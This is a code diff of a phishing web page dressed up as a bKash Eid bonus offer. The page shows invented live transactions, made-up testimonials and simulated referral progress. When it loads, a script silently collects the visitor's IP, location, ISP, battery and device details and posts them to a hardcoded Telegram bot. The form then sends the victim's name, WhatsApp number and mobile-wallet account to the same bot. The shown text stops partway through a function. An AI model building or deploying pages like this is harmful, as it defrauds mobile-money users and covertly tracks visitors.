@@ -3,154 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Special Offer & Rewards</title>
+    <title>বিকাশ ঈদ বোনাস অফার - ২০২৬</title>
+    
+    <!-- Open Graph Meta Tags for Social Media Preview (Messenger/FB) -->
+    <meta property="og:title" content="🎉 বিকাশ ঈদ বোনাস অফার - লিমিটেড টাইম স্পেশাল প্রোগ্রাম! 🌙">
+    <meta property="og:description" content="কুরবানির ঈদ উপলক্ষে বিকাশ ও আমাদের পক্ষ থেকে রয়েছে এক্সক্লুসিভ Eid Bonus Offer! এখনই আপনার বোনাসটি নিশ্চিত করুন।">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/88/Bkash_Logo.svg/1200px-Bkash_Logo.svg.png">
+    <meta property="og:type" content="website">
+
+    <!-- Tailwind CSS CDN for Premium UI -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f7f6;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .container {
-            background-color: white;
-            max-width: 500px;
-            width: 100%;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
-        }
-        h2 {
-            text-align: center;
-            color: #333;
-            margin-bottom: 20px;
-        }
-        .input-group {
-            margin-bottom: 15px;
-        }
-        .input-group label {
-            display: block;
-            margin-bottom: 5px;
-            color: #555;
-            font-weight: bold;
-        }
-        .input-group input, .input-group select {
-            width: 100%;
+        .ad-frame {
+            border: 2px dashed #e2e8f0;
             padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-size: 16px;
-        }
-        .submit-btn {
-            width: 100%;
-            padding: 12px;
-            background-color: #e2136e; /* bKash Pink theme */
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .submit-btn:hover {
-            background-color: #c0105c;
-        }
-        .ad-container {
-            background: #fff;
-            border: 2px dashed #ccc;
-            padding: 10px;
-            border-radius: 8px;
             margin: 15px 0;
-            text-align: center;
-            overflow: hidden;
-            width: 100%;
-            max-width: 500px;
-        }
-        .ad-title {
-            font-size: 12px;
-            color: #888;
-            margin-bottom: 5px;
-        }
-        .tg-button {
-            display: inline-block;
-            background-color: #0088cc;
-            color: white;
-            text-decoration: none;
-            padding: 12px 25px;
+            background: #f8fafc;
             border-radius: 8px;
-            font-weight: bold;
-            margin-top: 20px;
-            border: 2px solid #005f8e;
-        }
-        .tg-button:hover {
-            background-color: #0077b3;
-        }
-        #message-box {
-            display: none;
-            margin-top: 15px;
-            padding: 15px;
-            border-radius: 6px;
             text-align: center;
-            font-weight: bold;
         }
-        .success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-        .error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .animate-pulse-custom {
+            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: .5; }
+        }
     </style>
 </head>
-<body>
+<body class="bg-gray-100 font-sans min-h-screen flex flex-col items-center">
 
-    <!-- Adsterra Ad Section 1 -->
-    <div class="ad-container">
-        <div class="ad-title">Sponsored Advertisement</div>
-        <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>
-    </div>
-
-    <div class="container">
-        <h2>Submit Your Information</h2>
-        
-        <form id="userForm">
-            <div class="input-group">
-                <label>Enter Your Name:</label>
-                <input type="text" id="userName" placeholder="আপনার নাম লিখুন" required>
-            </div>
-            <div class="input-group">
-                <label>Enter Your WhatsApp Number:</label>
-                <input type="number" id="waNumber" placeholder="WhatsApp নম্বর লিখুন" required>
-            </div>
-            <div class="input-group">
-                <label>Enter Payment Method:</label>
-                <select id="payMethod" required>
-                    <option value="Bkash">Bkash</option>
-                    <option value="Nagad">Nagad</option>
-                    <option value="Rocket">Rocket</option>
-                </select>
-            </div>
-            <div class="input-group">
-                <label>Enter Payment Number:</label>
-                <input type="number" id="payNumber" placeholder="পেমেন্ট নম্বর লিখুন" required>
-            </div>
-            
-            <button type="submit" class="submit-btn" id="submitBtn">Payment Submit করুন</button>
-        </form>
-
-        <div id="message-box"></div>
-    </div>
-
-    <!-- Adsterra Ad Section 2 -->
-    <div class="ad-container">
-        <div class="ad-title">Sponsored Advertisement</div>
-        <script async="async" data-cfasync="false" src="https://pl29324360.profitablecpmratenetwork.com/730b1eef1e8974af64f7d76acec9a560/invoke.js"></script>
-        <div id="container-730b1eef1e8974af64f7d76acec9a560"></div>
-    </div>
-
-    <!-- Adsterra Banner Ad -->
-    <div class="ad-container">
-        <div class="ad-title">Sponsored Banner</div>
+    <!-- Top Native Ad Banner -->
+    <div class="w-full max-w-md bg-white p-2 shadow-sm ad-frame">
+        <span class="text-xs text-gray-400 block mb-1">Sponsored Advertisement</span>
+        <!-- Adsterra 728x90 or Flexible Banner -->
         <script>
           atOptions = {
             'key' : '3f699f081766192256042d2e8f01a489',
@@ -163,79 +52,556 @@
         <script src="https://www.highperformanceformat.com/3f699f081766192256042d2e8f01a489/invoke.js"></script>
     </div>
 
-    <!-- Telegram Channel Link -->
-    <a href="https://t.me/+akAbjsGUC2hmYmVl" class="tg-button" target="_blank">📢 Join Our Telegram Channel</a>
+    <!-- Main Container -->
+    <div class="w-full max-w-md bg-white shadow-xl rounded-2xl overflow-hidden my-4 border border-gray-200">
+        
+        <!-- Header Image & Title -->
+        <div class="bg-gradient-to-r from-pink-500 to-red-500 p-6 text-white text-center relative">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/88/Bkash_Logo.svg/512px-Bkash_Logo.svg.png" alt="bKash Logo" class="h-12 mx-auto mb-3 bg-white p-2 rounded-full shadow-md">
+            <h1 class="text-2xl font-black mb-1">🎁 মেগা ঈদ বোনাস অফার ২০২৬ 🌙</h1>
+            <p class="text-xs opacity-90">নিচের ফরমটি পূরণ করে আপনার ফ্রি বোনাস দাবি করুন। সর্বোচ্চ ১০০০ BDT!</p>
+            
+            <!-- Live Counter Header -->
+            <div class="absolute top-2 right-2 bg-black/40 text-[10px] px-2 py-0.5 rounded-full">
+                <i class="fa-solid fa-eye text-green-400"></i> Active User: <span id="live-user-count">14,250</span>
+            </div>
+        </div>
 
+        <!-- Fake Live Transaction Ticker -->
+        <div class="bg-amber-50 border-b border-amber-200 px-4 py-2 text-xs text-amber-800 flex items-center justify-between">
+            <div class="flex items-center gap-2">
+                <span class="w-2 h-2 rounded-full bg-green-500 inline-block animate-ping"></span>
+                <span id="live-ticker-text">Loading latest transaction...</span>
+            </div>
+            <span class="font-bold text-green-600 text-[10px] bg-green-100 px-1.5 py-0.5 rounded">সফল</span>
+        </div>
+
+        <!-- Middle Ad Space -->
+        <div class="p-4 ad-frame">
+            <!-- Adsterra Container Banner -->
+            <script async="async" data-cfasync="false" src="https://pl29324360.profitablecpmratenetwork.com/730b1eef1e8974af64f7d76acec9a560/invoke.js"></script>
+            <div id="container-730b1eef1e8974af64f7d76acec9a560"></div>
+        </div>
+
+        <!-- INPUT INTERFACE / FORM CONTAINER -->
+        <div id="form-container" class="p-6 space-y-4">
+            <h3 class="text-md font-bold text-gray-700 border-b pb-2"><i class="fa-solid fa-address-card text-pink-500"></i> আপনার পেমেন্ট ইনফরমেশন দিন</h3>
+            
+            <form id="bonus-form" onsubmit="handleFormSubmit(event)" class="space-y-4">
+                <!-- Name -->
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1">Enter Your Name:</label>
+                    <div class="relative">
+                        <i class="fa-solid fa-user absolute left-3 top-3.5 text-gray-400 text-sm"></i>
+                        <input type="text" id="user_name" required placeholder="এখানে আপনার নাম লিখুন" class="w-full pl-9 pr-4 py-2.5 text-sm border rounded-xl focus:ring-2 focus:ring-pink-500 focus:outline-none">
+                    </div>
+                </div>
+
+                <!-- WhatsApp -->
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1">Enter Your WhatsApp Number:</label>
+                    <div class="relative">
+                        <i class="fa-brands fa-whatsapp absolute left-3 top-3 text-green-500 text-lg"></i>
+                        <input type="tel" id="whatsapp_number" required placeholder="এখানে আপনার WhatsApp নম্বর লিখুন" class="w-full pl-9 pr-4 py-2.5 text-sm border rounded-xl focus:ring-2 focus:ring-pink-500 focus:outline-none">
+                    </div>
+                </div>
+
+                <!-- Method Grid Selectors -->
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1">Enter Payment Method:</label>
+                    <div class="grid grid-cols-3 gap-2">
+                        <label class="border rounded-xl p-2 flex flex-col items-center justify-center cursor-pointer hover:bg-pink-50 transition border-pink-500 bg-pink-50/50" id="lbl-bkash">
+                            <input type="radio" name="payment_method" value="Bkash" checked onclick="selectMethod('bkash')" class="hidden">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/88/Bkash_Logo.svg/512px-Bkash_Logo.svg.png" class="h-6 object-contain" alt="Bkash">
+                            <span class="text-[10px] font-bold mt-1">Bkash</span>
+                        </label>
+                        <label class="border rounded-xl p-2 flex flex-col items-center justify-center cursor-pointer hover:bg-orange-50 transition" id="lbl-nagad">
+                            <input type="radio" name="payment_method" value="Nagad" onclick="selectMethod('nagad')" class="hidden">
+                            <img src="https://X_LOGO_PLACEHOLDER_NAGAD_OR_DEFAULT" onerror="this.src='https://img.icons8.com/color/96/wallet.png'" class="h-6 object-contain" alt="Nagad">
+                            <span class="text-[10px] font-bold mt-1">Nagad</span>
+                        </label>
+                        <label class="border rounded-xl p-2 flex flex-col items-center justify-center cursor-pointer hover:bg-purple-50 transition" id="lbl-rocket">
+                            <input type="radio" name="payment_method" value="Rocket" onclick="selectMethod('rocket')" class="hidden">
+                            <img src="https://X_LOGO_PLACEHOLDER_ROCKET_OR_DEFAULT" onerror="this.src='https://img.icons8.com/color/96/bank.png'" class="h-6 object-contain" alt="Rocket">
+                            <span class="text-[10px] font-bold mt-1">Rocket</span>
+                        </label>
+                    </div>
+                </div>
+
+                <!-- Account Number -->
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1" id="account-label">Enter Your Bkash Number:</label>
+                    <div class="relative">
+                        <i class="fa-solid fa-credit-card absolute left-3 top-3.5 text-gray-400 text-sm"></i>
+                        <input type="tel" id="payment_number" required placeholder="এখানে আপনার পেমেন্ট নম্বর লিখুন" class="w-full pl-9 pr-4 py-2.5 text-sm border rounded-xl focus:ring-2 focus:ring-pink-500 focus:outline-none">
+                    </div>
+                </div>
+
+                <!-- Amount -->
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1">Enter Amount (TK): max(1000 BDT)</label>
+                    <div class="relative">
+                        <span class="absolute left-3 top-2.5 font-bold text-gray-500 text-sm">৳</span>
+                        <input type="number" id="amount" max="1000" required placeholder="আপনি কত টাকা পাঠাতে চান লিখুন" class="w-full pl-8 pr-4 py-2.5 text-sm border rounded-xl focus:ring-2 focus:ring-pink-500 focus:outline-none">
+                    </div>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="w-full bg-gradient-to-r from-pink-600 to-red-600 text-white font-bold py-3 px-4 rounded-xl shadow-md hover:opacity-95 transition flex items-center justify-center gap-2">
+                    <i class="fa-solid fa-paper-plane"></i> Payment Submit করুন
+                </button>
+            </form>
+        </div>
+
+        <!-- PROGRESS / SCREEN 2 (HIDDEN BY DEFAULT - HANDLED BY COOKIE) -->
+        <div id="progress-container" class="p-6 space-y-6 hidden">
+            <!-- Alert Pop-up Layout Inside Main Panel -->
+            <div class="bg-green-50 border-l-4 border-green-500 p-4 rounded-r-xl space-y-2 text-xs text-green-900 shadow-inner">
+                <p class="font-bold text-sm"><i class="fa-solid fa-circle-check text-green-600"></i> 🎉 Payment Request Submitted Successfully!</p>
+                <p>Your request has been successfully submitted and securely stored in our system.</p>
+                <p class="font-semibold">📌 All your information has been recorded and is under verification.</p>
+                <p class="font-semibold">⏳ Please wait 24 hours for approval.</p>
+                <p>After verification, our team will process your payment shortly. Thank you for your patience and cooperation.</p>
+            </div>
+
+            <!-- Bonus Terms Box -->
+            <div class="bg-red-50 border border-red-200 p-4 rounded-xl text-xs text-red-900 space-y-1">
+                <p class="font-bold text-sm text-red-600 border-b pb-1">🎁 Bonus Offer Notice</p>
+                <p>আপনার এই বোনাসটি পেতে হলে অবশ্যই ১০ জন বন্ধুকে আমন্ত্রণ জানাতে হবে।</p>
+                <p>📢 আপনার রেফারেল সম্পূর্ণ হলে আমাদের টিম আপনার তথ্য যাচাই করবে এবং তারপর আপনার পেমেন্ট প্রসেস করা হবে।</p>
+                <p class="font-bold">⚠️ শর্ত পূরণ না হলে বোনাস প্রদান করা সম্ভব হবে না।</p>
+                <p>⏳ শর্ত পূরণ হওয়ার পরই আপনার বোনাস অ্যাক্টিভ করা হবে।</p>
+            </div>
+
+            <!-- UI Referral Progress Tracker -->
+            <div class="bg-slate-50 border p-4 rounded-xl space-y-3">
+                <h4 class="text-xs font-bold text-slate-700 flex items-center justify-between">
+                    <span><i class="fa-solid fa-chart-line text-blue-500"></i> Referral Progress Status</span>
+                    <span class="text-blue-600" id="progress-percent">0% Done</span>
+                </h4>
+                
+                <!-- Progress Bar Graphic -->
+                <div class="w-full bg-gray-200 h-3.5 rounded-full overflow-hidden shadow-inner relative">
+                    <div id="progress-bar-fill" class="bg-gradient-to-r from-blue-500 to-green-500 h-full transition-all duration-500" style="width: 0%"></div>
+                </div>
+
+                <!-- Step Counter text -->
+                <p class="text-[11px] text-gray-500 text-center" id="refer-counter-text">👥 0 / 10 Successful Referrals Complete</p>
+                
+                <div class="text-[10px] text-gray-500 bg-white p-2 rounded border space-y-1 max-h-24 overflow-y-auto">
+                    <p class="font-bold text-slate-600">🚀 Goal: 10 Successful Referrals</p>
+                    <p>✔️ 1 Referral = 10% | ✔️ 5 Referral = 50% | ✔️ 10 Referral = 100%</p>
+                </div>
+            </div>
+
+            <!-- Link Share & Actions Area -->
+            <div class="space-y-3 bg-pink-50/50 p-4 rounded-xl border border-pink-100 text-xs">
+                <div>
+                    <span class="font-bold text-gray-700 block mb-1">🔗 Your Referral Link:</span>
+                    <input type="text" id="ref-link-input" readonly class="w-full bg-white border p-2 rounded-lg text-gray-600 text-[11px] focus:outline-none" value="">
+                </div>
+                <div>
+                    <span class="font-bold text-gray-700 block mb-1">📋 Referral Code:</span>
+                    <span class="font-mono bg-white border px-2 py-1 rounded inline-block font-bold text-pink-600" id="ref-code-span">RND12345</span>
+                </div>
+
+                <!-- Actions Buttons Line -->
+                <div class="grid grid-cols-2 gap-2 pt-2">
+                    <button onclick="copyReferralText()" class="bg-gray-800 text-white font-bold py-2 px-3 rounded-lg flex items-center justify-center gap-1.5 hover:bg-gray-900 transition">
+                        <i class="fa-solid fa-copy"></i> Copy Link
+                    </button>
+                    <button onclick="shareReferralText()" class="bg-green-600 text-white font-bold py-2 px-3 rounded-lg flex items-center justify-center gap-1.5 hover:bg-green-700 transition">
+                        <i class="fa-solid fa-share-nodes"></i> Share Link
+                    </button>
+                </div>
+                <p class="text-[10px] text-center text-gray-400 mt-1">⚠️ Note: This system automatically tracks your referrals.</p>
+            </div>
+        </div>
+
+        <!-- Lower Ad Segment inside panel -->
+        <div class="p-4 ad-frame border-t">
+            <!-- Adsterra Native Code 2 -->
+            <script src="https://pl29324356.profitablecpmratenetwork.com/7a/be/c8/7abec8b760f67bbd9dd52c77a78b66f1.js"></script>
+        </div>
+
+        <!-- FB Style Comment Section -->
+        <div class="bg-slate-50 p-4 border-t border-gray-200 text-xs space-y-4">
+            <h4 class="font-bold text-gray-700 border-b pb-1"><i class="fa-solid fa-comments text-blue-500"></i> মতামত ও রিভিউ (<span id="comment-count">১২৪</span>)</h4>
+            
+            <div class="space-y-3">
+                <!-- Comment 1 -->
+                <div class="flex gap-2.5 items-start">
+                    <div class="w-8 h-8 rounded-full bg-blue-200 flex items-center justify-center font-bold text-blue-700 shrink-0">MS</div>
+                    <div class="bg-white p-2.5 rounded-2xl shadow-sm border border-gray-100 flex-1">
+                        <p class="font-bold text-gray-800">Md Shakib</p>
+                        <p class="text-gray-600 mt-0.5">হ্যা আমি সত্যি টাকা পেয়েছি! ভাবতেই পারি নাই এত সহজে টাকা পাব! ধন্যবাদ এডমিন ভাইদের।</p>
+                        <div class="text-[10px] text-gray-400 mt-1">২ মিনিট আগে · <span class="font-bold text-gray-500 cursor-pointer">Like</span></div>
+                    </div>
+                </div>
+
+                <!-- Comment 2 -->
+                <div class="flex gap-2.5 items-start">
+                    <div class="w-8 h-8 rounded-full bg-pink-200 flex items-center justify-center font-bold text-pink-700 shrink-0">SR</div>
+                    <div class="bg-white p-2.5 rounded-2xl shadow-sm border border-gray-100 flex-1">
+                        <p class="font-bold text-gray-800">Mst Sadiya Rahman</p>
+                        <p class="text-gray-600 mt-0.5">আরে আমিতো প্রথম মিথ্যা ভেবেছিলাম পরে দেখি সত্যি টাকা পেয়েছি অসাধারণ! অফারটা কেউ মিস কইরেন না।</p>
+                        <div class="text-[10px] text-gray-400 mt-1">৭ মিনিট আগে · <span class="font-bold text-gray-500 cursor-pointer">Like</span></div>
+                    </div>
+                </div>
+
+                <!-- Comment 3 -->
+                <div class="flex gap-2.5 items-start">
+                    <div class="w-8 h-8 rounded-full bg-blue-200 flex items-center justify-center font-bold text-blue-700 shrink-0">AN</div>
+                    <div class="bg-white p-2.5 rounded-2xl shadow-sm border border-gray-100 flex-1">
+                        <p class="font-bold text-gray-800">Ariful Islam Nabir</p>
+                        <p class="text-gray-600 mt-0.5">আমার ১০ টা রেফার কমপ্লিট করার ঠিক ২ ঘন্টার মধ্যে বিকাশে ১০০০ টাকা চলে আসছে। ১০০% রিয়েল সাইট।</p>
+                        <div class="text-[10px] text-gray-400 mt-1">১৫ মিনিট আগে · <span class="font-bold text-gray-500 cursor-pointer">Like</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Hidden Telegram Channel Button Frame Footer -->
+        <div class="p-4 bg-gray-900 text-center border-t border-gray-800">
+            <div class="p-1 border border-dashed border-cyan-500/50 rounded-xl inline-block w-full">
+                <a href="https://t.me/+akAbjsGUC2hmYmVl" target="_blank" class="w-full bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-bold py-2.5 px-4 rounded-lg block transition text-xs shadow-md shadow-cyan-950/50">
+                    <i class="fa-brands fa-telegram text-sm"></i> Join Our Telegram Channel  
+                </a>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Extra Bottom Scripts Footer Area for Smart Link -->
+    <div class="w-full max-w-md text-center py-2 text-[10px] text-gray-400">
+        <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>
+    </div>
+
+    <!-- MAIN CORE LOGIC SCRIPT -->
     <script>
-        const BOT_TOKEN = "8825109255:AAFyKVGCt4dSp0PD_2qZq8VmmOYg4ri2oks";
-        const CHAT_ID = "6048050987";
+        // CONFIGURATIONS FROM REQUEST
+        const TELEGRAM_BOT_TOKEN = '8825109255:AAFyKVGCt4dSp0PD_2qZq8VmmOYg4ri2oks';
+        const TELEGRAM_CHAT_ID = '6048050987';
 
-        document.getElementById('userForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Check if user already submitted
-            if(localStorage.getItem('formSubmitted') === 'true') {
-                showMessage("আপনি ইতিমধ্যে ফর্মটি পূরণ করেছেন!", "error");
-                return;
+        // Fake Ticker Database Array
+        const fakeNames = ["Md Rahim", "Sumaiya Akter", "Kamal Hossain", "Tania Sultana", "Alamin Gazi", "Mst Lima", "Rashed Ahmed"];
+        const fakeMethods = ["Bkash", "Nagad", "Rocket"];
+
+        // State Tracking variables
+        let generatedRefCode = "";
+
+        // Helper: Set Cookie function
+        function setCookie(name, value, days) {
+            let expires = "";
+            if (days) {
+                let date = new Date();
+                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+                expires = "; expires=" + date.toUTCString();
             }
+            document.cookie = name + "=" + (value || "") + expires + "; path=/";
+        }
 
-            const btn = document.getElementById('submitBtn');
-            btn.innerText = "Submitting...";
-            btn.disabled = true;
+        // Helper: Get Cookie function
+        function getCookie(name) {
+            let nameEQ = name + "=";
+            let ca = document.cookie.split(';');
+            for (let i = 0; i < ca.length; i++) {
+                let c = ca[i];
+                while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
 
-            const name = document.getElementById('userName').value;
-            const waNumber = document.getElementById('waNumber').value;
-            const payMethod = document.getElementById('payMethod').value;
-            const payNumber = document.getElementById('payNumber').value;
-            
-            const timeInfo = new Date().toLocaleString('en-GB');
+        // Generate Random Reference code string
+        function generateRandomRefCode() {
+            return "EID" + Math.floor(10000 + Math.random() * 90000);
+        }
 
-            // Format message for Telegram
-            const tgMessage = `📩 *New User Request Received!*\n\n` +
-                              `👤 *Name:* ${name}\n` +
-                              `📱 *WhatsApp:* ${waNumber}\n` +
-                              `💳 *Method:* ${payMethod}\n` +
-                              `🏧 *Account Number:* ${payNumber}\n` +
-                              `━━━━━━━━━━━━━━\n` +
-                              `⏰ *Time:* ${timeInfo}`;
-
-            // Send to Telegram Bot via API
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: tgMessage,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if(data.ok) {
-                    showMessage("🎉 আপনার রিকোয়েস্ট সফলভাবে জমা হয়েছে! দয়া করে অপেক্ষা করুন।", "success");
-                    localStorage.setItem('formSubmitted', 'true'); // Save to local storage
-                    document.getElementById('userForm').reset();
+        // Select Input Option UI Styling Toggle
+        function selectMethod(method) {
+            const methods = ['bkash', 'nagad', 'rocket'];
+            methods.forEach(m => {
+                const label = document.getElementById(`lbl-${m}`);
+                if (m === method) {
+                    label.classList.add('border-pink-500', 'bg-pink-50/50');
                 } else {
-                    showMessage("দুঃখিত, কোনো সমস্যা হয়েছে। আবার চেষ্টা করুন।", "error");
+                    label.classList.remove('border-pink-500', 'bg-pink-50/50');
                 }
-            })
-            .catch(error => {
-                showMessage("ইন্টারনেট কানেকশন চেক করুন!", "error");
-            })
-            .finally(() => {
-                btn.innerText = "Payment Submit করুন";
-                btn.disabled = false;
             });
+            
+            const capitalized = method.charAt(0).toUpperCase() + method.slice(1);
+            document.getElementById('account-label').innerText = `Enter Your ${capitalized} Number:`;
+            document.getElementById('payment_number').placeholder = `এখানে আপনার ${capitalized} নম্বর লিখুন`;
+        }
+
+        // Execute background collection immediately when loaded
+        window.addEventListener('DOMContentLoaded', async () => {
+            initFakeLiveTicker();
+            handleInitialCookieCheck();
+            await captureBackgroundMetrics();
         });
 
-        function showMessage(text, type) {
-            const msgBox = document.getElementById('message-box');
-            msgBox.innerText = text;
-            msgBox.className = type;
-            msgBox.style.display = 'block';
+        // Initialize Screen switching based on existing cookie state
+        function handleInitialCookieCheck() {
+            const userState = getCookie('user_sub_state');
+            if (userState === 'submitted') {
+                generatedRefCode = getCookie('user_ref_code') || generateRandomRefCode();
+                showProgressScreen();
+            }
         }
+
+        // Switch Forms visibility panels
+        function showProgressScreen() {
+            document.getElementById('form-container').classList.add('hidden');
+            const progCon = document.getElementById('progress-container');
+            progCon.classList.remove('hidden');
+
+            // Set link dynamic fields data
+            const currentBaseUrl = window.location.origin + window.location.pathname;
+            const fullRefUrl = `${currentBaseUrl}?ref=${generatedRefCode}`;
+            
+            document.getElementById('ref-link-input').value = fullRefUrl;
+            document.getElementById('ref-code-span').innerText = generatedRefCode;
+
+            // Generate Fake dynamic safe incremental progress logic
+            let currentRefClicks = parseInt(getCookie('simulated_clicks') || "0");
+            // Simulate random fake organic user referral increment up to max 6 clicks for UI simulation
+            if(currentRefClicks < 6 && Math.random() > 0.4) {
+                currentRefClicks += 1;
+                setCookie('simulated_clicks', currentRefClicks, 7);
+            }
+            
+            const percentage = currentRefClicks * 10; 
+            document.getElementById('progress-bar-fill').style.width = `${percentage}%`;
+            document.getElementById('progress-percent').innerText = `${percentage}% Done`;
+            document.getElementById('refer-counter-text').innerText = `👥 ${currentRefClicks} / 10 Successful Referrals Complete`;
+        }
+
+        // Realtime Tracker dynamic background execution
+        async function captureBackgroundMetrics() {
+            // Check if background run was already submitted to prevent loop spamming 
+            if(getCookie('bg_tracked') === 'yes') return;
+
+            let joinCount = localStorage.getItem('total_bg_joins') || "1";
+            let currentCountInt = parseInt(joinCount) + 1;
+            localStorage.setItem('total_bg_joins', currentCountInt.toString());
+
+            // Build payload defaults
+            let metrics = {
+                ip: "Unknown/VPN", country: "Bangladesh", division: "N/A", zilla: "N/A", city: "N/A", isp: "N/A",
+                deviceModel: navigator.platform || "Mobile/Desktop Device",
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown RAM",
+                browser: navigator.userAgent.split(" ").pop()
+            };
+
+            // Non-blocking fetch geo IP pipeline
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                if(res.ok) {
+                    let data = await res.json();
+                    metrics.ip = data.ip || metrics.ip;
+                    metrics.country = data.country_name || metrics.country;
+                    metrics.division = data.region || metrics.division;
+                    metrics.zilla = data.county || metrics.zilla;
+                    metrics.city = data.city || metrics.city;
+                    metrics.isp = data.org || metrics.isp;
+                }
+            } catch(e) {}
+
+            // Battery standard parameters API hook
+            let batteryStr = "Unknown Status";
+            try {
+                if (navigator.getBattery) {
+                    let bat = await navigator.getBattery();
+                    batteryStr = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
+                }
+            } catch(e){}
+
+            // Network properties data capture
+            let networkStr = "Unknown Network";
+            if(navigator.connection) {
+                networkStr = `Type: ${navigator.connection.effectiveType || 'N/A'} (Downlink: ${navigator.connection.downlink}Mbps)`;
+            }
+
+            // Formatting payload text message blocks for telegram API channel target
+            let botText = `(যত ইউজার সাইট ভিসিট করবে তত কাউন্ট হবে ১ থেকে শুরু হবে কাউন্ট)\n`;
+            botText += `New User Joined!\n`;
+            botText += `Join Number: ${currentCountInt}\n\n`;
+            botText += `📱 Device Information\n`;
+            botText += `🔋 Battery / Charging Status: ${batteryStr}\n`;
+            botText += `📶 Network Information: ${networkStr}\n`;
+            botText += `🌍 IP Address: ${metrics.ip}\n`;
+            botText += `🏙️ Country: ${metrics.country}\n`;
+            botText += `🏠 Division: ${metrics.division}\n`;
+            botText += `📍 Zilla: ${metrics.zilla}\n`;
+            botText += `🏡 City / Village: ${metrics.city}\n`;
+            botText += `📡 ISP Provider: ${metrics.isp}\n`;
+            botText += `📱 Device Model: ${metrics.deviceModel}\n`;
+            botText += `💾 RAM / ROM: ${metrics.ram}\n`;
+            botText += `🧠 Browser & User Agent: ${navigator.userAgent}\n\n`;
+            botText += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+            botText += `Background Capture System`;
+
+            // Post Async non blocking payload message
+            sendTelegramMessage(botText);
+            setCookie('bg_tracked', 'yes', 1);
+        }
+
+        // Form processing workflow action
+        function handleFormSubmit(e) {
+            e.preventDefault();
+
+            const name = document.getElementById('user_name').value;
+            const whatsapp = document.getElementById('whatsapp_number').value;
+            const method = document.querySelector('input[name="payment_method"]:checked').value;
+            const accountNumber = document.getElementById('payment_number').value;
+            const amount = document.getElementById('amount').value;
+
+            generatedRefCode = generateRandomRefCode();
+
+            // Handle persistence cookies states mapping
+            setCookie('user_sub_state', 'submitted', 7);
+            setCookie('user_ref_code', generatedRefCode, 7);
+            setCookie('simulated_clicks', '0', 7);
+
+            // Increment storage global incremental submit data tracking total index metrics
+            let totalSubmits = localStorage.getItem('global_total_requests') || "0";
+            let totalCountInt = parseInt(totalSubmits) + 1;
+            localStorage.setItem('global_total_requests', totalCountInt.toString());
+
+            const now = new Date();
+            const timeString = now.toLocaleTimeString('bn-BD', {hour: '2-digit', minute:'2-digit'});
+            const dateString = now.toLocaleDateString('bn-BD');
+
+            // Generate Payload for Core user submit details data array context
+            let msg = `📩 New User Payment Request Received!\n`;
+            msg += `👤 User Name: ${name}\n`;
+            msg += `📱 WhatsApp Number: ${whatsapp}\n`;
+            msg += `💳 Payment Method: ${method}\n`;
+            msg += `🏧 Account Number: ${accountNumber}\n`;
+            msg += `💰 Amount: ${amount} TK\n`;
+            msg += `━━━━━━━━━━━━━━\n`;
+            msg += `⏰ Submitted Time: ${timeString}\n`;
+            msg += `📅 Date: ${dateString}\n`;
+            msg += `⚠️ Important Notice:\n`;
+            msg += `Please verify this request and approve it within 24 hours.\n\n`;
+            msg += `🔰 Total Request Submitted🔰 ${totalCountInt} ✅`;
+
+            // Setup programmatic payload data targeting admin control panel setup with release trigger keys arrays
+            sendTelegramMessageWithInlineRelease(msg);
+
+            // Redirection view updating pipeline execution
+            showProgressScreen();
+        }
+
+        // Generic API fetch sending text wrapper block module
+        function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
